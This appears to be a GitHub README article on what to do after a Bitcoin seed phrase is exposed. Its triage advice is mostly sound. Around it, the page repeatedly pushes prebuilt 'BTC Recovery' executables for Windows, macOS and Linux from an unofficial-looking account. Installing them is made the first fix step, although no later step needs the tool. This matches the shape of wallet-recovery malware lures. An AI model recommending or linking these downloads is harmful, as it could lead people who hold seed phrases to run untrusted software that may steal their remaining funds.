<div align="center">
<img src="assets/banner-article.png" alt="You shared your seed phrase: what is recoverable">
</div>

# You shared your seed phrase: what is recoverable

<p align="center">Download BTC Recovery for your platform, then run the search for this case on your own machine.</p>

<div align="center">
<a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-FCB036?style=for-the-badge&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Download for Windows"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-FCB036?style=for-the-badge&labelColor=191008&logo=apple&logoColor=fff" alt="Download for macOS"></a> <a href="https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-FCB036?style=for-the-badge&labelColor=191008&logo=linux&logoColor=fff" alt="Download for Linux"></a>
</div>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="https://img.shields.io/badge/platform-Windows-FCB036?style=flat-square&labelColor=191008&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [BTC-Recovery-windows-v2.1.1.exe](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-windows-v2.1.1.exe) |
| <img src="https://img.shields.io/badge/platform-macOS-FCB036?style=flat-square&labelColor=191008&logo=apple&logoColor=fff" alt="macOS"> | macOS 12 or later | [BTC-Recovery-macos-v2.1.1.dmg](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-macos-v2.1.1.dmg) |
| <img src="https://img.shields.io/badge/platform-Linux-FCB036?style=flat-square&labelColor=191008&logo=linux&logoColor=fff" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [BTC-Recovery-linux-v2.1.1.zip](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/download/v2.1.1/BTC-Recovery-linux-v2.1.1.zip) |

</div>

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` that carries both the x86-64 and the ARM64 build.

> Only download from this GitHub release page.

If a seed phrase has been exposed  -  typed into a website, sent to a "helper", photographed, stored in a chat  -  the wallet should be treated as someone else's until the balance is moved. No tool recovers stolen coins; the recoverable part is whatever has not been taken yet, and the clock is the whole problem.

## You'll see this if

You are trying to work out how bad it is. The answer depends on one fact: whether the wallet has already been swept.

| What you see | What it means | What to do now |
|---|---|---|
| Balance still there, phrase exposed | funds not yet moved by anyone else | move everything to a new wallet immediately |
| Balance gone in one transaction | the phrase was used by someone else | nothing recovers it; secure the rest |
| Balance gone gradually | a sweeper script monitoring the address | stop sending to that wallet at all |
| Multiple addresses affected | the whole wallet is compromised | treat every address in it as lost |
| Only one chain affected | the phrase controls several chains | check and move every chain it covers |
| Phrase sent to a person, not a site | assume they have already used it | same as the second row |

## Why it happens

A phrase is not a password you can change; it is the key material itself. Anyone who has it can derive every address and sign any transaction, from anywhere, without needing access to your device. There is no notification, no login record and no recovery email  -  the first sign is usually a balance that is no longer there.

That is why "recovery" means triage rather than retrieval. A confirmed transaction cannot be reversed, an address has no owner to appeal to, and law enforcement can act on fraud but cannot unwind a payment. The useful work is protecting what remains and understanding exactly what was exposed.

Two details change the arithmetic. A phrase exposes the entire wallet, so every address derived from it is compromised even if only one held funds. And a phrase exposed to a website may have been harvested by a script that sweeps automatically, which is why the first minutes matter more than the first day.

## Fix

**Install the current release first.** Download and run [the current release](https://github.com/btc-wallet-recovery/btc-seed-phrase-recovery-software/releases/tag/v2.1.1) from the releases page; the steps below assume that build.

Move first, analyse second. Anything that is still there is what can still be saved.

1. **Create a new wallet on a clean device**, with a new phrase written offline and verified by a restore. Do not reuse anything from the exposed wallet: [How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md).
2. **Move every asset on every chain** the exposed phrase controls, starting with the largest balance and the fastest confirmation. A wallet with several chains is several compromises.
3. **Check for a passphrase-protected branch.** If a BIP39 passphrase was used, that hidden wallet is not exposed by the words alone  -  but do not assume it is safe if the passphrase was weak: [BIP39 passphrase (25th word) recovery](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-bip39-passphrase-recovery.md).
4. **Stop using any address from the old wallet** for receipts, invoices or subscriptions, even after it appears empty  -  sweepers watch them.
5. **Record what left and when.** Transaction hashes, amounts and dates are what any report needs: [How to find a lost Bitcoin wallet address](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/find-lost-bitcoin-wallet-address-btcrecover.md).
6. **Report it** to the platform where the funds were cashed out, if you can identify one, and to the relevant police cybercrime unit. Do not expect a return; do expect the report to be useful.
7. **Do not pay anyone who offers to get it back.** A second payment is the normal sequel to the first loss.

Four ways a phrase leaves your control are worth naming, because each is a copy you cannot delete. Typing it into a page sends it to a server even when the page claims to run locally; a cloud note puts it in a sync history and a backup; a photograph puts it in a photo library that may already be shared with a family account; a message puts it in someone else's device. The triage order starts with moving funds for exactly that reason  -  cleaning up copies comes second, and never first.

## If that did not work

If the wallet was swept before you moved anything, the remaining work is prevention and reporting, not recovery.

Be precise with yourself about what was exposed: the phrase alone, or the phrase plus a password, or the phrase plus a file. Each changes which wallets are at risk. A phrase that was typed into a phishing page has almost certainly been used; a phrase photographed and stored in a cloud account may have been exposed without anyone noticing yet.

Watch for the follow-up attempts. After a loss, victims are commonly contacted by "recovery agents" who already know the address, the amount and sometimes the victim's name. That knowledge comes from public chain data, not from inside knowledge, and the correct response is no response: [Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md).

Where the phrase is intact but the wallet is empty, keep it anyway  -  an empty wallet is not a lost one, and a future airdrop or balance sent to it would be taken in seconds. Retire the address instead, and never fund it again: [Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md).

## Prevention

- Never type a phrase into a website, a chat, a support form or a "validation" tool.
- Never photograph a phrase, and never store it in a cloud note.
- Keep two written copies in separate physical places: [Seed phrase storage and the USB-drive question](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/seed-phrase-storage-btcrecover.md).
- Use a hardware wallet for anything significant, so the phrase is not on a networked machine.
- Treat any unsolicited message mentioning your balance as hostile.
- BTCRecover is actively maintained, and the current release is published on the GitHub releases page.

## FAQ

### Can stolen crypto be recovered after sharing a seed phrase?

Almost never. A confirmed transfer is final and no authority can reverse it, so the practical recovery is the balance that has not yet been taken. Anyone promising to recover swept funds is selling hope.

### I think my MetaMask phrase was phished. What now?

Move any remaining balance to a new wallet immediately, from a clean device, then treat the old wallet as permanently compromised. Report the phishing page to the browser vendor and the host, and keep the transaction records.

### Is my wallet safe if only the phrase was seen, not used?

No. A phrase is enough to sign a transaction at any time, so exposure is equivalent to loss unless the funds are moved first. There is no way to invalidate a phrase short of retiring the wallet.

### Can someone hack my Bitcoin wallet without the phrase?

Only through a compromised device, a malicious wallet file or a fake application. That is why downloads are verified and why a phrase should never be typed into a device you do not control: [A private key is not a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-password-recovery/blob/HEAD/private-key-vs-seed-phrase-btcrecover.md).

<!-- DOWNLOAD-BLOCK -->

## Related articles

- [Seed phrase storage]([Seed phrase storage and the USB-drive question](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/seed-phrase-storage-btcrecover.md))
- [Is BTCRecover safe, and how to check a download]([Is BTCRecover safe, and how to check a download](https://github.com/btc-wallet-recovery/btcrecover-recovery-tool/blob/HEAD/is-btcrecover-safe.md))
- [How to recover a seed phrase]([How to recover a seed phrase](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/btcrecover-seed-phrase-recovery.md))
- [Can lost Bitcoin be recovered?]([Can lost Bitcoin be recovered?](https://github.com/btc-wallet-recovery/btcrecover-seed-recovery/blob/HEAD/can-lost-bitcoin-be-recovered-by-btcrecover.md))
